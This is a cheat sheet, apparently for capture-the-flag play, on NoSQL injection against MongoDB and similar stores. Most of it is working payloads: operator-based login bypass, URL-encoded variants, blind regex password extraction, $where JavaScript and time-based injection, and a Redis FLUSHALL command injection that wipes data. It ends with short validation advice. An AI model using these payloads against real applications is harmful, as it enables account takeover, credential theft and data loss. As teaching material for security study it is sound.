# NoSQL Injection - Basics

## Quick Reference

| Operator | Purpose | Example |
|----------|---------|---------|
| `$ne` | Not equal | `{"$ne": ""}` |
| `$gt` | Greater than | `{"$gt": ""}` |
| `$regex` | Pattern match | `{"$regex": "^a"}` |
| `$exists` | Field exists | `{"$exists": true}` |
| `$in` | In array | `{"$in": ["a","b"]}` |
| `$where` | JS execution | `{"$where": "code"}` |

**Common Payloads:**
```json
{"$ne": ""}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

---

## What is NoSQL Injection?

NoSQL Injection manipulates NoSQL database queries by injecting malicious payloads. Unlike SQL injection, NoSQL uses JSON-based queries requiring different attack techniques.

**Impact:**
- 🔓 Authentication bypass
- 📊 Data extraction
- 👤 Authorization bypass
- 🚫 Denial of Service
- 💻 Remote Code Execution

**Vulnerable Databases:** MongoDB (High risk), CouchDB, Redis, Cassandra, Elasticsearch

---

## MongoDB Injection Techniques

### Safe Query
```javascript
db.users.find({ username: "admin", password: "password123" })
```

### Vulnerable Code
```javascript
// ❌ Direct user input in query
db.users.findOne({ 
    username: req.body.username,  
    password: req.body.password   
})
```

### 1️⃣ Authentication Bypass (`$ne`)

Inject `{"$ne": ""}` to make password NOT EQUAL to empty string (always true):

```json
{"username": "admin", "password": {"$ne": ""}}
```

**Result:** Logs in with ANY password ✅

### 2️⃣ Bypass Both Fields

Make both username AND password always true:

```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

**Result:** Logs in as FIRST user in database (often admin) ✅

### 3️⃣ Target Specific Users

Use `$in` to target multiple accounts:

```json
{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$ne": ""}}
```

### 4️⃣ Other Operators

**Greater Than:**
```json
{"password": {"$gt": ""}}
```

**Field Exists:**
```json
{"password": {"$exists": true}}
```

**Regex Match:**
```json
{"password": {"$regex": ".*"}}
```

---

## URL-Encoded Payloads

**Query String (GET):**
```
GET /login?username=admin&password[$ne]=
GET /login?username[$ne]=&password[$ne]=
```

**Form Data (POST):**
```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password[$ne]=
```

**URL Encoding Reference:**
```
$ = %24
[ = %5B
] = %5D

Example: password[$ne]= → password%5B%24ne%5D=
```

---

## Regex Blind Injection

Extract data character-by-character using regex patterns.

**Extract Length:**
```javascript
{"username": "admin", "password": {"$regex": "^.{5}$"}}  // 5 chars
{"username": "admin", "password": {"$regex": "^.{6}$"}}  // 6 chars
```

**Extract Characters:**
```javascript
{"username": "admin", "password": {"$regex": "^a"}}   // Starts with 'a'?
{"username": "admin", "password": {"$regex": "^ab"}}  // Starts with 'ab'?
{"username": "admin", "password": {"$regex": "^abc"}} // Starts with 'abc'?
```

**Regex Patterns:**
- `^` = Start of string
- `$` = End of string
- `.` = Any character
- `*` = Zero or more
- `^.{5}$` = Exactly 5 characters

---

## Advanced: JavaScript Injection

The `$where` operator executes JavaScript code server-side.

**Vulnerable Pattern:**
```javascript
db.users.find({ $where: `this.username == '${username}'` })
```

**JavaScript Injection Payload:**
```javascript
// Input: ' || 'a'=='a
// Query becomes:
$where: "this.username == '' || 'a'=='a'"  // Always true!
```

**Regex Extraction:**
```javascript
$where: "this.password.match(/^flag{/)"
$where: "this.password[0] == 'f'"
```

**Time-Based Blind Injection:**
```javascript
$where: "this.username == 'admin' ? sleep(5000) : false"
// True = 5 second delay, False = immediate response
```

---

## Other NoSQL Databases

**CouchDB:**
```json
{"selector": {"username": "admin", "password": {"$ne": ""}}}
```

**Redis Command Injection:**
```
?key=test\r\nFLUSHALL\r\n
```

**Cassandra (SQL-like):**
```sql
username: admin' OR '1'='1
```

---

## Exploitation Workflow

**Step 1: Identify Database**
- Check error messages for MongoDB/Redis
- Look for JSON requests
- Test JSON payloads

**Step 2: Test Basic Injection**
```json
{"$ne": ""}
{"$gt": ""}
{"$regex": ".*"}
```

**Step 3: Bypass Authentication**
```json
{"username": "admin", "password": {"$ne": ""}}
```

**Step 4: Extract Data (Blind Regex)**
```json
{"password": {"$regex": "^flag{a"}}
{"password": {"$regex": "^flag{ab"}}
```

---

## Common Vulnerable Patterns

**Pattern 1: Direct Assignment**
```javascript
const query = req.body;
db.users.findOne(query);  // ❌ Entire body becomes query
```

**Pattern 2: No Validation**
```javascript
db.users.findOne({ 
    username: req.body.username,  // ❌ No type check
    password: req.body.password 
});
```

**Pattern 3: String Interpolation**
```javascript
db.users.find({ 
    $where: `this.username == '${username}'`  // ❌ JS injection
});
```

---

## CTF Tips & Tools

**Quick Payload Tests:**
```json
{"$ne": ""}
{"$gt": ""}
{"$regex": ".*"}
{"$exists": true}
```

**Common Challenges:**
- 🔓 Login bypass
- 👤 Admin access
- 🚩 Flag extraction via regex
- 📋 User enumeration

**Flag Extraction:**
```json
{"username": "admin", "password": {"$regex": "^flag{a"}}
{"username": "admin", "password": {"$regex": "^flag{ab"}}
{"username": "admin", "password": {"$regex": "^flag{abc"}}
```

**Tools:**
- NoSQLMap (Automated injection)
- Burp Suite (Manual testing)
- MongoDB Docs (Operators)---

## Key Takeaways

✅ NoSQL operators (`$ne`, `$gt`, `$regex`) behave like wildcards
✅ JSON format is key indicator of NoSQL database
✅ Regex blind injection extracts data character-by-character
✅ Validate input types to prevent operator injection
✅ Never trust user input in query structure